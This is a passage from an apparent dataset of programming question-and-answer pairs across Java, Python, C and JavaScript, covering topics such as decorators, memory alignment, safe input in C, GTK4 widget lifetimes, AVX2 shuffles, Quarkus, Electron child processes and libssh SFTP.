public abstract class MainMenuConfigurator implements AMConfigurator {
private final String id;
private final List<NMAction> actions;

public MainMenuConfigurator(String id) {
    this.id = id;
    this.actions = new ArrayList();
}

public void addAction(NMAction action) {
    this.actions.add(action);
}

public void configure(ActionsManager manager) {
    MDActionsCategory category = (MDActionsCategory)manager.getActionFor(this.id);
    if (category == null) {
        category = this.createActionsCategory();
        manager.addCategory(category);
    }

    category.addActions(this.actions);
}

@Nonnull
protected abstract MDActionsCategory createActionsCategory();}

Then extend this class like this
public class MyMainMenu extends MainMenuConfigurator {

public MyMainMenu() {
    super(""suchi.main.menu"");
}

@Nonnull
protected MDActionsCategory createActionsCategory() {
    MDActionsCategory category = new MDActionsCategory(""myID"", ""TEST"");
    category.setNested(true);
    return category;
}

public int getPriority() {return 10;}}

Finally call it
ActionsConfiguratorsManager configurationManager = ActionsConfiguratorsManager.getInstance();
MyMainMenu myMainMenu = new MyMainMenu();
configurationManager.addMainMenuConfigurator(myMainMenu);

",java
wraps gives typeerror when used in a decorator,"I created a decorator to print the name of the function it decorates and it works:
>>> def debug(func):
...    msg=func.__qualname__
...    def wrapper(*args, **kwargs):
...       print(msg)
...       return func(*args, **kwargs)
...    return wrapper
... 
>>> @debug
... def add(x, y):
...    return x+y
... 
>>> add(1,2)
add
3

Now I wanted to apply the wraps decorator to the wrapper but when I did I got the error ""TypeError: update_wrapper() got multiple values for argument 'wrapped'""
>>> from functools import wraps
>>>
>>> def debug(func):
...    msg=func.__qualname__
...    @wraps
...    def wrapper(*args, **kwargs):
...       print(msg)
...       return func(*args, **kwargs)
...    return wrapper
... 
>>> @debug
... def add(x, y):
...    return x+y
... 
>>> add(1,2)
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
TypeError: update_wrapper() got multiple values for argument 'wrapped'
>>>

What I'm doing wrong and why the error occurs?
","Got it. Sorry, the issue was that I forgot to pass 'func' to the wraps decorator. Here is the correct code:
def debug(func):
   msg = func.__qualname__
   @wraps(func)
   def wrapper(*args, **kwargs):
      print(msg)
      return func(*args, **kwargs)
   return wrapper

",python
struggling to understand data alignement,"So basically I am struggling to understand data alignement. I don't understand why on a 64 bits architecture for example its important to store an 4 byte data to a multiple of the address 0x0, 0x4, 0x8, 0xC. Does the fetch of the CPU start to every multiple of the size of the word (which is 8 bytes here ) ? and why a 2 byte data have to be store at 0x0, 0x2, 0x4, 0x6, 0x8, 0xA, 0xC, 0xE address ? the CPU could load in one clock 2 byte data even if it is store at 0x1... So why it should be at the address 0x0, 0x2, 0x4, 0x6, 0x8, 0xA, 0xC, 0xE.
Plus if the CPU cache line is for example 64 bytes for example why should I care of the data alignment if the data does not overlap between the address 0x...00 and 0x...40 ?
its confusing ...
","For an object of n bytes that is smaller than the word size used to access memory, ensuring the object is aligned to a multiple of n bytes ensures the object will not straddle words (provided n is a factor of the word size).
Suppose a machine has an eight-byte memory interface: Every aligned sequence of eight bytes can be read from memory or written to memory with a single transfer operation. So all eight bytes from 0 to 7 can be read from memory in one transfers, all eight bytes from 8 to 15 can be read from memory in one transfers, and so on. But reading just the two bytes 7 and 8 would require two transfers, because the machine architecture cannot read just any eight bytes in a transfer; it can only read one sequence of eight bytes starting at a multiple of eight.
Now consider a four-byte object type, say int. When somebody declares an array of these, int a[7];, what happens when a starts at address 2? The object a[0] is in bytes 2, 3, 4, and 5. The object a[1] is in 6, 7, 8, and 9. And so on.
a[0] can be read in a single memory transfer. The CPU can get bytes 0-7 in one transfer and take a[0] out of bytes 2-5. However, a[1] cannot be read in a single memory transfer. The CPU cannot read bytes 6, 7, 8, and 9 in one transfer. It needs to issue one transfer to get bytes 0-7 and another to get 8-9.
When we require a four-byte object type have four-byte alignment, we prevent this. Then the array a of int a[7]; could not start at byte 2. It would have to start at byte 0, 4, 8, 12, and so on. If, for example, it starts at byte 4, then a[0] is in bytes 4-7, which is inside the eight-byte set 0-7. a[1] is in 8-11, which is inside 8-15. a[2] is in 12-15, which is inside 8-15. And so every element of a is inside one eight-byte set of aligned bytes. So memory access will be more efficient than if a were not four-byte aligned.
",c
403 error when trying to web scrape online job sites using python,"I am trying to web scrape online job offering web sites for my coursera project.
I keep getting a 403 error which, after I searched for its meaning online, I found out that it means that the web site has anti-web scraping protection.
Does anyone any countermeasure for this ?
PS: I have tried web scraping on indeed and weworkremotely web sites with the same error after executing my code.
Here's my code:
import requests
from bs4 import BeautifulSoup
import pandas as pd

url = 'https://weworkremotely.com/remote-jobs'

# We Work Remotely website blocks traffic from non-browsers, so we add extra parameters
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'
}

# Send a request to the website and get the HTML content
response = requests.get(url, headers=headers)

# Check if the request was successful
if response.status_code == 200:
    soup = BeautifulSoup(response.content, 'html.parser')

    # Creating empty lists to store the data
    job_titles = []
    companies = []
    locations = []
    job_links = []

    job_sections = soup.find_all('section', class_='jobs')

    for section in job_sections:
        jobs = section.find_all('li', class_='feature')  # Ensure this class matches the site's HTML

        for job in jobs:
            # Job title
            title_tag = job.find('span', class_='title')
            title = title_tag.text.strip() if title_tag else 'N/A'
            job_titles.append(title)

            # Company name
            company_tag = job.find('span', class_='company')
            company = company_tag.text.strip() if company_tag else 'N/A'
            companies.append(company)

            # Location
            location_tag = job.find('span', class_='region company')
            location = location_tag.text.strip() if location_tag else 'Remote'
            locations.append(location)

            # Job link
            job_link_tag = job.find('a', href=True)
            job_link = 'https://weworkremotely.com' + job_link_tag['href'] if job_link_tag else 'N/A'
            job_links.append(job_link)

    # Create a DataFrame using the extracted data
    job_data = pd.DataFrame({
        'Job Title': job_titles,
        'Company': companies,
        'Location': locations,
        'Job Link': job_links
    })

    # Save the data to a CSV file
    job_data.to_csv('we_work_remotely_jobs.csv', index=False)
    print(""Job listings have been successfully saved to we_work_remotely_jobs.csv"")
else:
    print(f""Failed to retrieve the webpage. Status code: {response.status_code}"")


","To address a 403 Forbidden error when web scraping:

Use a Valid User-Agent: Set a common User-Agent header to mimic a browser.

Use Proxies: Rotate IP addresses using proxies to avoid IP blocking.

Respect robots.txt: Check and follow the website's scraping rules.

Add Delays: Introduce delays between requests to mimic human behavior.

Handle JavaScript: Use tools like Selenium for websites with JavaScript-rendered content.


Source: ScrapingBee - How to Handle a 403 Forbidden Error in Web Scraping
",python
how do you allow spaces to be entered using scanf,"Using the following code:
char *name = malloc(sizeof(char) + 256); 

printf(""What is your name? "");
scanf(""%s"", name);

printf(""Hello %s. Nice to meet you.\n"", name);

A user can enter their name but when they enter a name with a space like Lucas Aardvark, scanf() just cuts off everything after Lucas. How do I make scanf() allow spaces
","People (and especially beginners) should never use scanf(""%s"") or gets() or any other functions that do not have buffer overflow protection, unless you know for certain that the input will always be of a specific format (and perhaps not even then).
Remember than scanf stands for ""scan formatted"" and there's precious little less formatted than user-entered data. It's ideal if you have total control of the input data format but generally unsuitable for user input.
Use fgets() (which has buffer overflow protection) to get your input into a string and sscanf() to evaluate it. Since you just want what the user entered without parsing, you don't really need sscanf() in this case anyway:
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Maximum name size + 1. */

#define MAX_NAME_SZ 256

int main(int argC, char *argV[]) {
    /* Allocate memory and check if okay. */

    char *name = malloc(MAX_NAME_SZ);
    if (name == NULL) {
        printf(""No memory\n"");
        return 1;
    }

    /* Ask user for name. */

    printf(""What is your name? "");

    /* Get the name, with size limit. */

    fgets(name, MAX_NAME_SZ, stdin);

    /* Remove trailing newline, if there. */

    if ((strlen(name) > 0) && (name[strlen (name) - 1] == '\n'))
        name[strlen (name) - 1] = '\0';

    /* Say hello. */

    printf(""Hello %s. Nice to meet you.\n"", name);

    /* Free memory and exit. */

    free (name);
    return 0;
}

",c
what39s the meaning of an object39s monitor in java why use this word,"When reading articles about Java threads, I often notice the expression: ""current thread is the owner of this object's monitor"". I get the meaning: the thread gets the right to operate on the object. But I am puzzled why we use the phrase ""the object's monitor"" instead of ""the object's lock""?
In brief, I don't know the meaning of the word 'monitor'
The question may be strange and simple. But I wish anybody can help to solve it. 3ks
","
but I am puzzled why use word ""the object's monitor"" instend of ""the object's lock""?

See ulmangt's answer for links that explain the term ""monitor"" as used in this context.  Note that:

""Monitors were invented by Per Brinch Hansen and C. A. R. Hoare, and were first implemented in Brinch Hansen's Concurrent Pascal language.""

(Source: Wikipedia)
Why use the term ""monitor"" rather than ""lock""?  Well strictly speaking, the terms do mean different things ... especially if you use them in the way that they were originally intended to be used.

A ""lock"" is something with acquire and release primitives that maintain certain lock properties; e.g. exclusive use or single writer / multiple reader.

A ""monitor"" is a mechanism that ensures that only one thread can be executing a given section (or sections) of code at any given time.  This can be implemented using a lock (and ""condition variables"" that allow threads to wait for or send notifications to other threads that the condition is fulfilled), but it is more than just a lock.  Indeed, in the Java case, the actual lock used by a monitor is not directly accessible.  (You just can't say ""Object.lock()"" to prevent other threads from acquiring it ... like you can with a Java Lock instance.)


In short, if one were to be pedantic ""monitor"" is actually a better term than ""lock"" for characterizing what Java is providing.  But in practice, both terms are used almost interchangeably.
",java
how do called functions return to their caller after being called,"I read that when a function call is made by a program, the called function must know how to return to its caller.  
My question is: How does the called function know how to return to its caller? Is there a mechanism working behind the scenes through the compiler?  
","The compiler obeys a particular ""calling convention"", defined as part of the ABI you're targeting.  That calling convention will include a way for the system to know what address to return to.  The calling convention usually takes advantage of the hardware's support for procedure calls.  On Intel, for example, the return address is pushed to the stack:

...the processor pushes the value of the EIP register (which contains the offset of the instruction following the CALL instruction) on the stack (for use later as a return-instruction pointer).

Returning from a function is done via the ret instruction:

... the processor pops the return instruction pointer (offset) from the top of the stack into the EIP register and begins program execution at the new instruction pointer. 

To contrast, on ARM, the return address is put in the link register:

The BL and BLX instructions copy the address of the next instruction into lr (r14, the link register).

Returns are commonly done by executing movs pc, lr to copy the address from the link register back into the program counter register.
References:

Intel Software Developers Manual
ARM Information Center

",c
data fetching from a static json file  react,"I have a static json file appyling this format:
[
    {/*OBJECT1*/}, {/*OBJECT2*/} /* SO ON ... */
]

I wanted to fetch data to my React Component from this JSON file
I fetch the data in my React component by using following code
  useEffect(() => {
    async function getEssayData() {
      const res = await fetch('/essayData.json');
      const data = await res.json();
      return data;
    }

    const fetchData = getEssayData();
    console.log('Result Data   ' + fetchData);
    console.log(fetchData);
    console.log('Data    ' + data[0]);
  }, []);

i've tried lots of things, this is only one of them; however i couldn't reach my objects inside of JSON file.
(Fetching is happening correctly but i couldn't reach data objects ...)
console image , i really appreciate if you can help me with that.
","When you try to log 'data' it is not defined there cause you created it inside a function (getEssayData). It is available only in that function. You shoul use useState to set the data which will be available anywhere in the component.

    const [data, setData] = useState(null);

  useEffect(() => {
    async function getEssayData() {
      const res = await fetch(""/essayData.json"");
      const data = await res.json();
      setData(data); // Save the fetched data in the state
    }
    getEssayData();
  }, []);

  // Log the fetched data when it is available
  useEffect(() => {
    if (data) {
      console.log(""Fetched Data: "", data);
      console.log(""First item: "", data[0]);
    }
  }, [data]);

",javascript
lombok added but getters and setters not recognized in intellij idea,"I am using IntelliJ IDEA on ubuntu. I added lombok.jar into my project and installed the Lombok plugin for IDEA. I have access to the annotations but the getters and setters aren't generated. I get the same errors I would get if I tried accessing a getter or setter method that doesn't exist. What could I be missing?
","I fixed it by ticking the ""Enable annotation processing"" checkbox in Settings->Compiler->Annotation Processors.
Along with this you might also need to install lombok plugin as mentioned in @X.Chen's answer for new versions of IntelliJ Idea. 
",java
how can we know the caller function39s name,"In the C language, __FUNCTION__ can be used to get the current function's name.
But if I define a function named a() and it is called in b(), like below:
b()
{
    a();
}

Now, in the source code, there are lots of functions like b() that call a(), e.g. c(), d(), e()...
Is it possible, within a(), to add some code to detect the name of the function that called a()?
Further:

Sorry for the misleading typo. I have corrected it.
I am trying to find out which function calls a() for debugging purposes. I
don't know how you do when in the same situation? 
And my code is under vxWorks, but I am not sure whether it is related to C99 or
something else.

","There's nothing you can do only in a.
However, with a simple standard macro trick, you can achieve what you want, IIUC showing the name of the caller.
void a()
{
    /* Your code */
}

void a_special( char const * caller_name )
{
    printf( ""a was called from %s"", caller_name );
    a();
}

#define a() a_special(__func__)

void b()
{
    a();
}

",c
how to use rendering result of scene as texture in threejs,"I would like to use the rendering result of the scene as a texture in ThreeJS.
Does ThreeJS have such a function?
","You can render a scene to a texture by passing a THREE.WebGLRenderTarget to THREE.WebGLRenderer.render().
First, create a render target of the desired size (this is your texture) :
var renderer = new THREE.WebGLRenderer();
var renderTarget = new THREE.WebGLRenderTarget(512, 512);

You can then use THREE.WebGLRenderTarget.texture on a material :
var geometry = new THREE.PlaneGeometry(1.0, 1.0);
var material = new THREE.MeshBasicMaterial({
    map: renderTarget.texture
});
var mesh = new THREE.Mesh(geometry, material);
scene.add(mesh);

Finally render the scene in 2 passes :
renderer.render(fakeScene, fakeCamera, renderTarget);
renderer.render(scene, camera);

You may want to create a new scene and a new camera to render on the renderTarget. It depends on what you want to do.
Take a look at this fiddle and this example.
",javascript
traversing a filesystem with fts3,"I have a question on fts(3).  I am getting a segmentation fault whenever I try to access any members of the fts_children() function.  When I read the man page at http://www.kernel.org/doc/man-pages/online/pages/man3/fts.3.html it claims to fill itself after the read function runs and returns a linked list linked through the link field in the structure.  My suspicion is that the child_function is returning nothing but I feel like that doesn't line up with the man page.  Am I supposed to be adding these files to the child buffer because I thought that was being done automatically?  My code is below,
Thanks!
#include<stdlib.h>
#include<stdio.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fts.h>
#include<string.h>

int compare (const FTSENT**, const FTSENT**);

int main(int argc, char* const argv[])
{

        FTS* file_system = NULL;
        FTSENT* child = NULL;
        FTSENT* parent = NULL;
        FTSENT* temp = NULL;

        file_system = fts_open(argv + 1,FTS_COMFOLLOW | FTS_NOCHDIR,&compare);

        while( (parent = fts_read(file_system)) != NULL)
        {

             child = fts_children(file_system,0);
             printf(""%s\n"", child->fts_path);


        }
//      while (child ->fts_link != NULL)
      //         child = child->fts_link;
        fts_close(file_system);
        return 0;
}

int compare(const FTSENT** one, const FTSENT** two){
        return (strcmp((*one)->fts_name, (*two)->fts_name));
}
""test_fs.c"" 43L, 1108C  

","You simply need to add a NULL check. 
You might want to 

add one for file_system 
check for command line arguments
Add more errorhandling:

The fts_children() function returns a pointer to an FTSENT structure describing the first entry in a NULL terminated linked list of files in the directory, if successful. The fts_children() function may fail and set errno for any of the errors that the chdir(), malloc(), opendir(), readdir(), and stat() functions specify.


Update To the new question(s) in the comment:

The while loop for linked list traversal was misplaced (outside the outer loop?)
The printf displayed only the path... not the filename. 

while you're at it:
#include<stdlib.h>
#include<stdio.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fts.h>
#include<string.h>
#include<errno.h>

int compare (const FTSENT**, const FTSENT**);

int main(int argc, char* const argv[])
{
    FTS* file_system = NULL;
    FTSENT* child = NULL;
    FTSENT* parent = NULL;

    if (argc<2)
    {
        printf(""Usage: %s <path-spec>\n"", argv[0]);
        exit(255);
    }

    file_system = fts_open(argv + 1,FTS_COMFOLLOW | FTS_NOCHDIR,&compare);

    if (NULL != file_system)
    {
        while( (parent = fts_read(file_system)) != NULL)
        {
            child = fts_children(file_system,0);

            if (errno != 0)
            {
                perror(""fts_children"");
            }

            while ((NULL != child)
                && (NULL != child->fts_link))
            {
                child = child->fts_link;
                printf(""%s%s\n"", child->fts_path, child->fts_name);
            }
        }
        fts_close(file_system);
    }
    return 0;
}

int compare(const FTSENT** one, const FTSENT** two)
{
    return (strcmp((*one)->fts_name, (*two)->fts_name));
}

Sample output fragment: 
./.profiles/sehe/.opera/icons/cache/g_0000
./.profiles/sehe/.opera/icons/cache/g_0000/opr00002.tmp
./.profiles/sehe/.opera/icons/cache/g_0000/opr00003.tmp
./.profiles/sehe/home/sehe/.mozilla
fts_children: Permission denied
./.vbox-sehe-ipc/lock

",c
remove key from dictionary in python returning new dictionary,"I have a dictionary
d = {'a':1, 'b':2, 'c':3}

I need to remove a key, say c and return the dictionary without that key in one function call
{'a':1, 'b':2}

d.pop('c') will return the key value - 3 - instead of the dictionary.
I am going to need one function solution if it exists, as this will go into comprehensions
","How about this:
{i:d[i] for i in d if i!='c'}

It's called Dictionary Comprehensions and it's available since Python 2.7.
or if you are using Python older than 2.7:
dict((i,d[i]) for i in d if i!='c')

",python
avx2 get every second int32,"I have an AVX2 vector (__m256i) of 8 int32 values. It looks like this:
[0,a,0,b,0,c,0,d]

a, b, c and d are non-zero positive int32 values. The other 4 elements in the vector are zero.
Now I want to have this 128-bit vector (__m128i):
[a,b,c,d]

So far I do this:
__m128i y = _mm256_extracti128_si256(_mm256_permutevar8x32_epi32(x, _mm256_setr_epi32(0, 2, 4, 6, 1, 3, 5, 7)), 0);

This results in a vpermd instruction which is quite an expensive one (source: https://www.agner.org/optimize/instruction_tables.pdf).
Isn't there a better (=faster) way to do this? I was hoping there is some int64 to int32 cast intrinsic, but I could not find it.
","You need a lane-crossing shuffle for the data-movement you want, and vpermd isn't terrible (3c latency, 1/clock throughput on Intel P cores, better on Zen 4, worse throughput on Zen 3 and earlier.)  https://uops.info/ has similar numbers to Agner Fog's data, but from fully automated testing with more detail, like separate latencies from different inputs to the output(s).
The only way you could save anything is if you could process multiple vectors at once.  e.g. vpsllq / vpor / vpermd to get a 256-bit vector of abcd | ABCD from two __m256i inputs.  If the high halves of your input elements weren't known zero, vpblendd is just as efficient as vpor, but slightly longer machine code including an immediate.  A bit-shift (_mm256_slli_epi64) instead of a shuffle like _mm256_bslli_epi128 can run on different ports that don't compete with shuffles.
(The 2 vectors to 1 pack instructions like vpackusdw only go as wide as 32-bit source elements, and are in-lane anyway.  If you had 32-bit inputs to pack to 16, you could use vpackusdw + vpermq for every 2 input vectors.)
With AVX-512, there's vpmovqd (with truncation, or alternate versions with signed or unsigned saturation).  https://www.felixcloutier.com/x86/vpmovqd:vpmovsqd:vpmovusqd .  That's still a lane-crossing shuffle, the only advantage is that it doesn't need a vector constant for the shuffle control.
With AVX-512, you can interleave two source vectors to one of the same width with vpermt2d and a shuffle-control vector.

Intel E-cores and Zen before Zen 4 have slower vpermd ymm
vpermd isn't great on Intel E-cores (Gracemont), being 2 uops and 2c throughput (and 6c latency), but spending more instructions is probably not better even on Gracemont and/or Zen <= 3 unless the surrounding code also bottlenecks on shuffle throughput.
vextracti128 + vshufps could get the job done more cheaply on Zen 1 and Bulldozer-family where extracting the high 128 is very cheap because YMMs are  handled in 128-bit halves.  But Gracemont which does the same still has 3c latency and 1/clock throughput for vextracti128 unfortunately.  (vshufps on integer data is generally fine; some CPUs don't even have any extra bypass -forwarding latency when it's part of a dep chain between integer instructions like vpaddd.)  But this would be worse on Intel P-cores: two shuffles, one of them still being port-5 only (the extract).  It might be break-even on Zen 2 and Zen 3 where vpermd is 2 uops.
One upside would be only needing immediate shuffle controls, vs. having to load a control vector for vpermd.  But that's not much of a problem if you do this in a loop where you can load the shuffle-control once.
",c
in structure how values get stored,"if a have a structure say 
struct first
{
   int a;
   int b;
 };

now if i create its object 
int main(){
struct first ob1,ob2;

ob1.a=5;
printf(""%u  %u"",&ob1,&(ob1.a));  //prints same address
printf(""%d  %d"",ob1,(ob1.a)); //  5,garbage value
return 0;}

my professor said that ob1 is a pointer to a structure. I want to know what address does ob1 and ob1.a also what value they store?
Also in c++ we have this pointer to assign value to ob1.a and ob2.a. In C how does compiler know in which object to store  value ? 
","ob1 is in no way a pointer.  It is a structure.
Since a is the first field of struct first, &ob1 and &ob1.a are the same address (but have different types).
In C, the compiler knows which object to store to because you have to tell it. In your case, you said ob1.a or ob2.a respectively.
Editorial note:  use %p to print pointers, and don't try to pass a structure to printf at all.
",c
how do i free a gtk 4 widget in c,"I'm writing some C code where I have an elaborate algorithm for building GTK 4 widgets, and some of these widgets may end up ""invalid"" due to certain combinations of input data. However, I cannot always know this beforehand with how I've designed my application (and having a prior ""validation"" step would likely be more costly than a few extra allocations from invalid widgets), so sometimes I end up allocating a container widget that then goes unused because there are no children to add to it. In those cases, I would like to free that widget at the end of the function if I've determined that it is invalid. I tried searching for a solution to this and found the question Free object/widget in GTK 2?, but it's for GTK 2 and the one answer mentions using gtk_widget_destroy () which seems to have been removed between GTK 3 and GTK 4.
So, how do I free a GTK 4 widget in C?
","To manually free a widget in GTK, you need to take ownership of it using g_object_ref_sink () as GtkWidget instances start out with a ""floating"" reference. After that, you can decide whether to parent it, and then use g_object_unref () to lower the reference count and potentially free it. Something like this:
// Create the widget.
GtkWidget *widget = some_widget_new ();

// Take ownership, ""sink"" the floating reference.
g_object_ref_sink (widget);

// Check if widget setup was successful
if (setup_widget (widget))
  // If it was, parent the widget.
  add_child (parent, widget);

// Decrease the refcount
g_object_unref (widget);

",c
javalangillegalstateexception too many recursive interceptor actions after switching to quarkusrestclient from quarkusrestreactiveclient,"This issue occured after switching from Quarkus 3.11.2 to 3.17.6 and from quarkus-rest-reactive-client to quarkus-rest-client.
My quarkus app builds successfully but i get the aforementioned error after it starts.
//application.properties

quarkus.rest-client.comment-reactive-client.url=http://localhost:8084

//Rest client Interface
import io.smallrye.mutiny.Uni;
import jakarta.ws.rs.GET;
import jakarta.ws.rs.Path;
import org.eclipse.microprofile.rest.client.inject.RegisterRestClient;

import java.util.List;

@Path(""/v1/db/comments"")
@RegisterRestClient(configKey = ""comment-reactive-client"")
public interface CommentReactiveRestClient {
    @GET
    Uni<List<Comment>> getComments();
}

//Quarkus Resource
@Inject
@RestClient
CommentReactiveRestClient commentReactiveRestClient;

@GET
Path(""/api/comments"")
public Multi<Comment> apiCall() {
    return commentReactiveRestClient.getComments().onItem().transformToMulti(list -> Multi.createFrom().iterable(list));
}

I am certain the new quarkus-rest-client causes this issue because i did not have this problem with the quarkus-rest-reactive-client
","This was a bug in Quarkus that has since been fixed: https://github.com/quarkusio/quarkus/pull/45716
The fix should be available in Quarkus 3.18.0
",java
electron js spawn works fine with quotpython versionquot but with quotpythonquot i don39t get any output,"I'm using Electron JS and trying to execute a command in a child process using spawn() from the child_process module.
When I run the command python --version, it correctly outputs the version of Python in the child process. However, when I run just python, the process seems to start but doesn't output anything, and the behavior appears inconsistent.
Here is a simplified version of my code:
const { spawn } = require('child_process');



const child = spawn('python', [], { shell: true });



child.stdout.on('data', (data) => {

  console.log(`stdout: ${data}`);

});



child.stderr.on('data', (data) => {

  console.error(`stderr: ${data}`);

});



child.on('close', (code) => {

  console.log(`Child process exited with code ${code}`);

});



What I expect:
Running python should launch the interactive Python REPL and provide output.
What actually happens:
When I run python --version, it works fine.
When I run just python, there is no output or REPL interaction visible in my app.
Additional Details:
Electron version: v34.0.0
Node.js version: v23.6.0
IDE: Visual Studio Code
OS: Windows 11 24H2
What could be causing this issue? Do I need to set up the child process differently to handle REPL or interactive commands in Electron?
","Your code is indeed correct, the only thing you've missed is that running a Python process as a spawn with no arguments will make it search arguments for a script file. To force interactive mode, you should add -i to the argument list (note that on a regular terminal it works fine without this). 
This NodeJS code snippet seems to solve your problem:
const { spawn } = require(""child_process"");

const py = spawn(""python"", [""-i""]);

py.on(""close"", code => console.log(""Closed: "" + code));

py.stdout.on(""data"", data => {
    console.log(data.toString());
})

py.stderr.on(""data"", data => {
    console.log(data.toString());
})

// Some example commands
const commands = [
    ""2 + 2"",
    ""print('Test')"",
    ""print(3 + 2)"",
    ""5 - 8"",
    ""exit(1234)""
]

var i = 0;
var input = setInterval(function() {
    py.stdin.write(commands[i] + '\n');
    i++;
    if (i >= commands.length) clearInterval(input);
}, 500);

",javascript
c  libssh and sftp  clientserver  creating sftp session hangs,"I implemented a client/server communication over SSH with libssh. I also want to implement file upload from client to the server now and have been following the doc for it.
However, it hangs on the call sftp = sftp_new(session);. Do I have to explicitly open another ssh_channel for it on the server side as well? I only added the sftp code on the client so far.
","For all who are struggling as well, I finally found the solution.
I found on the thread of this question that libssh/sftp.h does have separate functions for the server at the very end. To enable them, you have to use #define WITH_SERVER.
Despite the comment on the doc that you don't have to handle channels yourself, you do have to open a new channel on the server side for the SFTP communication. Implementing this worked for me:
while ((msg = ssh_message_get(session)))
{

    if (ssh_message_type(msg) == SSH_REQUEST_CHANNEL_OPEN && ssh_message_subtype(msg) == SSH_CHANNEL_SESSION)
    {
        printf(""[+] Got channel open request, opening new channel for sftp\n"");
        sftpChannel = ssh_message_channel_request_open_reply_accept(msg);
        ssh_message_free(msg);
    }

    if (ssh_message_type(msg) == SSH_REQUEST_CHANNEL && ssh_message_subtype(msg) == SSH_CHANNEL_REQUEST_SUBSYSTEM)
    {
        if (!strcmp(ssh_message_channel_request_subsystem(msg), ""sftp""))
        {
            ssh_message_channel_request_reply_success(msg);
            ssh_message_free(msg);

            // setup SFTP session
            sftp_session sftp = sftp_server_new(session, sftpChannel);
            if (sftp == NULL)
            {
                fprintf(stderr, ""Error allocating SFTP session: %s\n"", ssh_get_error(session));
            }                           
            int rc = sftp_server_init(sftp);
            if (rc != SSH_OK)
            {
               fprintf(stderr, ""Error initializing SFTP session: %i.\n"", sftp_get_error(sftp));
               sftp_free(sftp);
            }

            // handle communication...
         }
    }
}

",c
